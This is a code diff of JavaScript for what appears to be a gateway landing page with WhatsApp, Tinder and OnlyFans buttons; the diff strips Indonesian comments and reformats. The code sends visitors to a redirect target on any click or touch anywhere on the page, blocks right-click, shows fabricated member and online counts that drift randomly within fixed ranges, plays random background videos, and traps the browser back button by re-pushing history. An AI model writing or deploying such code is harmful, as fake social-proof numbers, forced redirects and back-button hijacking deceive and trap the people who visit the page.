@@ -491,31 +713,26 @@
             if (anyBtn) showLoadingOnButton(anyBtn);
         }
         
-        // Delay kecil untuk efek visual
         setTimeout(function() {
             window.location.href = targetRedirectUrl;
         }, 400); 
     }
-
-    // --- Event Listeners ---
 
     const whatsappBtn = document.getElementById('whatsappBtn');
     const tinderBtn = document.getElementById('tinderBtn');
     const onlyfansBtn = document.getElementById('onlyfansBtn');
     const backBtn = document.getElementById('backBtn');
 
-    // 1. Klik pada tombol tertentu
     [whatsappBtn, tinderBtn, onlyfansBtn].forEach(btn => {
         if (btn) {
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
-                e.stopPropagation(); // Mencegah trigger klik body
+                e.stopPropagation();
                 performRedirect(this);
             });
         }
     });
 
-    // 2. Klik pada area body (Click Anywhere)
     document.body.addEventListener('click', function(e) {
         const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
         if (!isButton && !isRedirecting) {
@@ -524,16 +741,14 @@
         }
     });
 
-    // 3. Touch support (untuk mobile)
     document.body.addEventListener('touchstart', function(e) {
         const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
         if (!isButton && !isRedirecting) {
-            e.preventDefault(); // Mencegah zoom/scroll double tap
+            e.preventDefault();
             performRedirect(null);
         }
     }, { passive: false });
 
-    // 4. Disable Context Menu (Right Click)
     document.body.addEventListener('contextmenu', function(e) {
         const isButton = e.target.closest('.btn-social');
         if (!isButton) {
@@ -543,7 +758,6 @@
         }
     });
 
-    // 5. Back Button Logic
     if (backBtn) {
         backBtn.addEventListener('click', function(e) {
             e.stopPropagation();
@@ -551,39 +765,28 @@
         });
     }
 
-	// Daftar Video
-	const videoList = [
-		'https://thumbsnap.com/i/tiAP6Uk1.mp4',
-		'https://thumbsnap.com/i/BrJcpXuM.mp4',
-		'https://thumbsnap.com/i/GHPahdDh.mp4'
-	];
+    const videoList = [
+        'https://thumbsnap.com/i/tiAP6Uk1.mp4',
+        'https://thumbsnap.com/i/BrJcpXuM.mp4',
+        'https://thumbsnap.com/i/GHPahdDh.mp4'
+    ];
 
-	// Fungsi untuk ambil video acak
-	function getRandomVideo() {
-		return videoList[Math.floor(Math.random() * videoList.length)];
-	}
+    function getRandomVideo() {
+        return videoList[Math.floor(Math.random() * videoList.length)];
+    }
 
-	// Fungsi Inisialisasi (Dijalankan saat halaman dibuka)
-	function initBackgroundVideo() {
-		const videoEl = document.getElementById('bgVideo');
-		if (!videoEl) return;
-    
-		// --- BAGIAN TERPENTING ---
-		// Baris ini yang memilih video acak DAN memasukkannya ke player.
-		// Pastikan TIDAK ADA tanda // di depannya.
-		videoEl.src = getRandomVideo(); 
-    
-		// Perintah browser untuk memulai memuat dan memutar
-		videoEl.load();
-		videoEl.play().catch(err => {
-			console.log("Autoplay dicegah browser.");
-		});
-	}
+    function initBackgroundVideo() {
+        const videoEl = document.getElementById('bgVideo');
+        if (!videoEl) return;
+        videoEl.src = getRandomVideo(); 
+        videoEl.load();
+        videoEl.play().catch(err => {
+            console.log("Autoplay blocked.");
+        });
+    }
 
-	// Panggil fungsi ini segera saat script dibaca
-	initBackgroundVideo();
+    initBackgroundVideo();
 
-    // Error handling video
     const bgVideo = document.getElementById('bgVideo');
     if (bgVideo) {
         bgVideo.addEventListener('ended', function() {
@@ -591,14 +794,13 @@
             this.play().catch(e => console.log("Loop error"));
         });
         bgVideo.addEventListener('error', function() {
-            console.log("Video error, mencoba video lain...");
+            console.log("Video error, trying another...");
             this.src = getRandomVideo();
             this.load();
             this.play().catch(() => {});
         });
     }
 
-    // --- Counter Animation Logic ---
     function animateCounters() {
         const memberEl = document.querySelector('#memberCountDisplay .count');
         const activeEl = document.querySelector('#activeMembersDisplay .count');
@@ -606,16 +808,13 @@
         if (memberEl && activeEl) {
             setInterval(() => {
                 if (!isRedirecting) {
-                    // Random Member Count
                     let currentMember = parseFloat(memberEl.innerText) || 130.6;
-                    let delta = (Math.random() * 0.5) - 0.2; // Fluktuasi kecil
+                    let delta = (Math.random() * 0.5) - 0.2;
                     let newMember = currentMember + delta;
-                    // Clamp values
                     if (newMember > 135) newMember = 135;
                     if (newMember < 128) newMember = 128;
                     memberEl.innerText = newMember.toFixed(1) + 'K';
                     
-                    // Random Active Count
                     let currentOnline = parseFloat(activeEl.innerText) || 50.8;
                     let deltaOnline = (Math.random() * 0.8) - 0.3;
                     let newOnline = currentOnline + deltaOnline;
@@ -623,21 +822,16 @@
                     if (newOnline < 45) newOnline = 45;
                     activeEl.innerText = newOnline.toFixed(1) + 'K';
                 }
-            }, 3000); // Update setiap 3 detik
+            }, 3000);
         }
     }
-
     animateCounters();
 
-    // --- History Lock (Opsional: Mencegah user tombol back browser) ---
-    // Hanya aktifkan jika ini adalah gateway landing page
     if (window.history && window.history.pushState) {
         history.pushState(null, null, location.href);
         window.addEventListener('popstate', function() {
             if (!isRedirecting) {
                 history.pushState(null, null, location.href);
-                // Jika ingin redirect saat tombol back ditekan, uncomment baris bawah:
-                // performRedirect(null); 
             }
         });
     }
